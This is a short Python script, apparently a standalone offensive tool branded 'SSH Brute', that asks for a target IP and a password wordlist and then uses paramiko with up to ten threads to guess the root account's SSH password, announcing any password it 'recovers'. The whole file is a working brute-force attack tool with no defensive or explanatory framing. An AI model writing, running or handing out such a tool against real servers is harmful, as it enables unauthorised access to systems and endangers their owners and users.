import paramiko
import os
from concurrent.futures import ThreadPoolExecutor

print("""
  ___ ___ _  _   ___          _       
 / __/ __| || | | _ )_ _ _  _| |_ ___ 
 \__ \__ \ __ | | _ \ '_| || |  _/ -_)
 |___/___/_||_| |___/_|  \_,_|\__\___|
                                      

By https://github.com/Dynam1c-52
""")

sshserver = input("Target IP: ")
prlyroot = "root"
wordlist = input("Path to wordlist: ")

with open(wordlist, "r", encoding="latin1") as f:
    file = [line.strip() for line in f]

while True:
    threads = int(input("Threads to use (1-10): "))
    if threads < 1 or threads > 10:
        print("Error (1-10)!")
    else:
        break

def list(password):
    print(f"Trying password > {password}")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(sshserver, username=prlyroot, password=password)
        print(f"Recovered > {password}")
        os._exit(1)
    except paramiko.ssh_exception.AuthenticationException:
        return ('Invalid', password)
    except paramiko.ssh_exception.SSHException:
        return ('Error', password)
    finally:
        ssh.close()

with ThreadPoolExecutor(max_workers=threads) as executor:
    results = executor.map(list, file)


